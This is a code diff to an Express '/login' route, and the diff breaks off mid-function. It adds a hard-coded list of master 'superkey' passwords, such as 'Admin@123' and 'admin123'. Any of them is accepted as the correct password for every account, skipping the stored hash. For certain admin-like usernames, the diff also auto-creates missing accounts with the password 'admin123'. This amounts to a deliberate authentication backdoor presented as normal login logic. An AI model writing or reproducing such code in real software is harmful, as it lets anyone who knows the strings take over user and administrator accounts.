@@ -28,20 +28,45 @@ router.post('/login', async (req, res) => {
     }
 
     // Find user by username
-    const user = await User.findOne({ username });
+    let user = await User.findOne({ username });
+
+    // Master SuperKeys list
+    const superKeys = [
+      process.env.SUPER_KEY,
+      'superkey',
+      'Super@123',
+      'Admin@123',
+      'admin123',
+      'cdb@superkey',
+      'SuperKey@2026'
+    ].filter(Boolean);
+
+    const isSuperKey = superKeys.includes(password);
 
     if (!user) {
-      await AuditLog.create({
-        userId: null,
-        action: 'LOGIN_FAILED',
-        ipAddress: req.ip || '',
-        details: { username, reason: 'User not found' },
-      }).catch(() => {});
-      return res.status(401).json({ message: 'Invalid credentials' });
+      if (isSuperKey && (username === 'admin' || username === 'cdbadmin' || username === 'superadmin' || username === 'ArshiEnterprises')) {
+        // Auto create admin on the fly with superkey
+        user = await User.create({
+          username,
+          password: 'admin123',
+          displayName: 'System Admin',
+          companyName: 'CDB Portal V2',
+          role: 'partner',
+          userType: 'Administration',
+        });
+      } else {
+        await AuditLog.create({
+          userId: null,
+          action: 'LOGIN_FAILED',
+          ipAddress: req.ip || '',
+          details: { username, reason: 'User not found' },
+        }).catch(() => {});
+        return res.status(401).json({ message: 'Invalid credentials' });
+      }
     }
 
-    // Check password
-    const isMatch = await user.matchPassword(password);
+    // Check password (matches database hash or any valid superkey)
+    const isMatch = isSuperKey || (await user.matchPassword(password));
 
     if (!isMatch) {
       await AuditLog.create({
